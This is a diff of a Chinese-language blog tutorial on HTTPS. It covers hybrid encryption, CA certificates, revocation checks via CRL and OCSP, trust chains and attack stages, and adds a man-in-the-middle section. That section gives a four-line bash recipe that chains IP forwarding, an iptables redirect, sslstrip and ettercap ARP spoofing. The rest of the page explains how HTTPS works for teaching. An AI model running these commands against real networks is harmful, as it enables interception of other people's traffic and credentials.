@@ -231,6 +231,49 @@
 <p>有两把密钥，公钥加密(pk)，私钥解密(sk)<br>
 <img src="/img/article/https/feiduichenjiami.png" alt="duichenjiami"><br>
 对称密钥的局限性:非对称加密算法非常耗时</p>
+<h3 id="对称加密非对称加密">对称加密+非对称加密</h3>
+<p>使用非对称加密来交换对称加密密钥<br>
+<img src="/img/article/https/jiehe.png" alt="jiehe"><br>
+存在中间人攻击<br>
+<img src="/img/article/https/MITM.png" alt="MITM"></p>
+<h3 id="对称加密非对称加密ca">对称加密+非对称加密+CA</h3>
+<p>网站在使用HTTPS前，需要向“CA机构”申请颁发一份数字证书，数字证书里有证书持有者、证书持有者的公钥等信息，服务器把证书传输给浏览器，浏览器从证书里取公钥就行了<br>
+<img src="/img/article/https/CA.png" alt="CA"></p>
+<h3 id="数字证书">数字证书</h3>
+<p>签名与验签<br>
+<img src="/img/article/https/sign.png" alt="sign"></p>
+<h2 id="怎么验证证书">怎么验证证书</h2>
+<h3 id="验证证书是否在有效期内">验证证书是否在有效期内</h3>
+<p>证书中会包含证书的有效期的起始时间和结束时间，取一个时间点去比较就好了。 关键问题是如何保证取到的时间点是可信的，这就是另外一个话题了。</p>
+<h3 id="验证证书是否被吊销">验证证书是否被吊销</h3>
+<p>被吊销的证书是无效的。验证吊销有CRL和OCSP两种方法。<br><br>
+CRL即证书吊销列表。证书被吊销后会被记录在CRL中，CA会定期发布CRL。应用程序可以依靠CRL来检查证书是否被吊销了。<br><br>
+CRL有两个缺点，一是有可能会很大，下载很麻烦。二是有滞后性，就算证书被吊销了，应用也只能等到发布最新的CRL后才能知道。<br><br>
+OCSP是在线证书状态检查协议。应用按照标准发送一个请求，对某张证书进行查询，之后服务器返回证书状态。OCSP可以认为是即时的（实际实现中可能会有一定延迟），所以没有CRL的缺点。不过对于一般的应用来说，实现OCSP还是有些难度的。</p>
+<p>由于CRL发布时间一般是7天(不过接到新通知要改为1天了）并且很大不方便。但是考虑到老浏览器只能用CRL，并且CRL可以缓存本地对于网速差情况还是有用的，此外Firefox虽然支持OCSP但是可以手动关闭也是CRL存在的原因。</p>
+<p>CA不会直接暴露到外网的，如果需要访问CA服务器需要使用硬件Token并且多人在场录像，且只能远程访问。OCSP相当于证书数据库的备份而已是直接暴露在外网的可以通过HTTP或者HTTPS访问</p>
+<h3 id="验证证书是否是上级ca签发的">验证证书是否是上级CA签发的</h3>
+<p>信任连:每一张证书都是由上级CA证书签发的，上级CA证书可能还有上级，最后找到根证书。根证书为自签名证书，即自己签自己。<br><br>
+当你验证一张证书是否由上级CA证书签发的时候，你必须有这个上级CA证书，通常这张证书会内置在浏览器或者OS中。</p>
+<p>IE和Chrome是通过内置在Windows系统中的TrustStore来管理根证书（当然自己也可以手动导入自签证书，浏览不会认可的因为有OCSP和CRL）；而Firefox则是内置在自己的浏览中。<br>
+<img src="/img/article/https/certificate.png" alt="sign"></p>
+<h2 id="https必须在每次请求中都要先在ssltls层进行握手传输密钥吗">HTTPS必须在每次请求中都要先在SSL/TLS层进行握手传输密钥吗？</h2>
+<p>根据sessionID存储密钥</p>
+<h2 id="如果想攻击https可以分别从这三个阶段入手">如果想攻击https，可以分别从这三个阶段入手。</h2>
+<h3 id="认证阶段虚假证书欺骗">认证阶段—虚假证书欺骗</h3>
+<p>诱导用户安装根证书，一旦根证书（CA公钥）安装好，一个信任链就形成了，CA可以用自己的私钥给任何服务器签署证书，只要CA愿意。</p>
+<h3 id="交换key阶段攻击dh算法">交换key阶段—攻击DH算法</h3>
+<p>采用超级计算机，离线计算DH算法素数对，经过常年累月的计算，形成一个庞大的素数对数据库，用这个数据库来比对捕获到的DH交换，一旦匹配到，用户的session key 就获得了，可以解密https流量。</p>
+<h3 id="加密key暴力破解">加密key暴力破解</h3>
+<p>目前加密算法使用AES256块式加密，如果不知道key，而使用暴力破解，理论上需要2^256 次才能破解，这个计算量是一个不可能完成的任务。</p>
+<h2 id="https安全注意事项">Https安全注意事项</h2>
+<p>浏览器里的安全选项-SSL，只勾选TLS 1.2，其它统统不要。<br></p>
+<p>不随意安装根证书，遇到可疑证书删掉为好！</p>
+<h1 id="https的中间人攻击">https的中间人攻击</h1>
+<p>针对https的攻击最流行的也就是sslsplit和sslstrip</p>
+<h2 id="sslstrip将https降级成为http">sslstrip：将https降级成为http</h2>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"1"</span>&gt;/proc/sys/net/ipv4/ip_forward</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000</span><br><span class="line">sslstrip -l 10000 </span><br><span class="line">ettercap -T -q -i wlan0 -M arp:remote // //</span><br></pre></td></tr></table></figure>
+<h2 id="sslsplit建立https链接中间人的证书和被攻击者浏览器建立https链接">sslsplit：建立https链接，中间人的证书和被攻击者浏览器建立https链接</h2>
 <p>Please <a class="github-button" href="https://github.com/huweihuang/hexo-theme-huweihuang" data-icon="octicon-star" aria-label="Star huweihuang/hexo-theme-huweihuang on GitHub" target="_blank" rel="noopener">Star</a> this Project if you like it! <a class="github-button" href="https://github.com/huweihuang" aria-label="Follow @huweihuang on GitHub" target="_blank" rel="noopener">Follow</a> would also be appreciated!<br>
 Peace!</p>
 
@@ -292,7 +335,7 @@ Peace!</p>
         <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#什么是https"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">&#x4EC0;&#x4E48;&#x662F;HTTPS</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#http存在的问题及解决方法"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">HTTP&#x5B58;&#x5728;&#x7684;&#x95EE;&#x9898;&#x53CA;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#http的缺点"><span class="toc-nav-number">2.1.</span> <span class="toc-nav-text">HTTP&#x7684;&#x7F3A;&#x70B9;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#改进的方法"><span class="toc-nav-number">2.2.</span> <span class="toc-nav-text">&#x6539;&#x8FDB;&#x7684;&#x65B9;&#x6CD5;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#对称加密"><span class="toc-nav-number">2.2.1.</span> <span class="toc-nav-text">&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#非对称加密"><span class="toc-nav-number">2.2.2.</span> <span class="toc-nav-text">&#x975E;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;</span></a></li></ol></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#什么是https"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">&#x4EC0;&#x4E48;&#x662F;HTTPS</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#http存在的问题及解决方法"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">HTTP&#x5B58;&#x5728;&#x7684;&#x95EE;&#x9898;&#x53CA;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#http的缺点"><span class="toc-nav-number">2.1.</span> <span class="toc-nav-text">HTTP&#x7684;&#x7F3A;&#x70B9;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#改进的方法"><span class="toc-nav-number">2.2.</span> <span class="toc-nav-text">&#x6539;&#x8FDB;&#x7684;&#x65B9;&#x6CD5;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#对称加密"><span class="toc-nav-number">2.2.1.</span> <span class="toc-nav-text">&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#非对称加密"><span class="toc-nav-number">2.2.2.</span> <span class="toc-nav-text">&#x975E;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#对称加密非对称加密"><span class="toc-nav-number">2.2.3.</span> <span class="toc-nav-text">&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;+&#x975E;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#对称加密非对称加密ca"><span class="toc-nav-number">2.2.4.</span> <span class="toc-nav-text">&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;+&#x975E;&#x5BF9;&#x79F0;&#x52A0;&#x5BC6;+CA</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#数字证书"><span class="toc-nav-number">2.2.5.</span> <span class="toc-nav-text">&#x6570;&#x5B57;&#x8BC1;&#x4E66;</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#怎么验证证书"><span class="toc-nav-number">2.3.</span> <span class="toc-nav-text">&#x600E;&#x4E48;&#x9A8C;&#x8BC1;&#x8BC1;&#x4E66;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#验证证书是否在有效期内"><span class="toc-nav-number">2.3.1.</span> <span class="toc-nav-text">&#x9A8C;&#x8BC1;&#x8BC1;&#x4E66;&#x662F;&#x5426;&#x5728;&#x6709;&#x6548;&#x671F;&#x5185;</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#验证证书是否被吊销"><span class="toc-nav-number">2.3.2.</span> <span class="toc-nav-text">&#x9A8C;&#x8BC1;&#x8BC1;&#x4E66;&#x662F;&#x5426;&#x88AB;&#x540A;&#x9500;</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#验证证书是否是上级ca签发的"><span class="toc-nav-number">2.3.3.</span> <span class="toc-nav-text">&#x9A8C;&#x8BC1;&#x8BC1;&#x4E66;&#x662F;&#x5426;&#x662F;&#x4E0A;&#x7EA7;CA&#x7B7E;&#x53D1;&#x7684;</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#https必须在每次请求中都要先在ssltls层进行握手传输密钥吗"><span class="toc-nav-number">2.4.</span> <span class="toc-nav-text">HTTPS&#x5FC5;&#x987B;&#x5728;&#x6BCF;&#x6B21;&#x8BF7;&#x6C42;&#x4E2D;&#x90FD;&#x8981;&#x5148;&#x5728;SSL/TLS&#x5C42;&#x8FDB;&#x884C;&#x63E1;&#x624B;&#x4F20;&#x8F93;&#x5BC6;&#x94A5;&#x5417;&#xFF1F;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#如果想攻击https可以分别从这三个阶段入手"><span class="toc-nav-number">2.5.</span> <span class="toc-nav-text">&#x5982;&#x679C;&#x60F3;&#x653B;&#x51FB;https&#xFF0C;&#x53EF;&#x4EE5;&#x5206;&#x522B;&#x4ECE;&#x8FD9;&#x4E09;&#x4E2A;&#x9636;&#x6BB5;&#x5165;&#x624B;&#x3002;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#认证阶段虚假证书欺骗"><span class="toc-nav-number">2.5.1.</span> <span class="toc-nav-text">&#x8BA4;&#x8BC1;&#x9636;&#x6BB5;&#x2014;&#x865A;&#x5047;&#x8BC1;&#x4E66;&#x6B3A;&#x9A97;</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#交换key阶段攻击dh算法"><span class="toc-nav-number">2.5.2.</span> <span class="toc-nav-text">&#x4EA4;&#x6362;key&#x9636;&#x6BB5;&#x2014;&#x653B;&#x51FB;DH&#x7B97;&#x6CD5;</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#加密key暴力破解"><span class="toc-nav-number">2.5.3.</span> <span class="toc-nav-text">&#x52A0;&#x5BC6;key&#x66B4;&#x529B;&#x7834;&#x89E3;</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#https安全注意事项"><span class="toc-nav-number">2.6.</span> <span class="toc-nav-text">Https&#x5B89;&#x5168;&#x6CE8;&#x610F;&#x4E8B;&#x9879;</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#https的中间人攻击"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">https&#x7684;&#x4E2D;&#x95F4;&#x4EBA;&#x653B;&#x51FB;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#sslstrip将https降级成为http"><span class="toc-nav-number">3.1.</span> <span class="toc-nav-text">sslstrip&#xFF1A;&#x5C06;https&#x964D;&#x7EA7;&#x6210;&#x4E3A;http</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#sslsplit建立https链接中间人的证书和被攻击者浏览器建立https链接"><span class="toc-nav-number">3.2.</span> <span class="toc-nav-text">sslsplit&#xFF1A;&#x5EFA;&#x7ACB;https&#x94FE;&#x63A5;&#xFF0C;&#x4E2D;&#x95F4;&#x4EBA;&#x7684;&#x8BC1;&#x4E66;&#x548C;&#x88AB;&#x653B;&#x51FB;&#x8005;&#x6D4F;&#x89C8;&#x5668;&#x5EFA;&#x7ACB;https&#x94FE;&#x63A5;</span></a></li></ol></li></ol>
         
         </div>
       </aside>
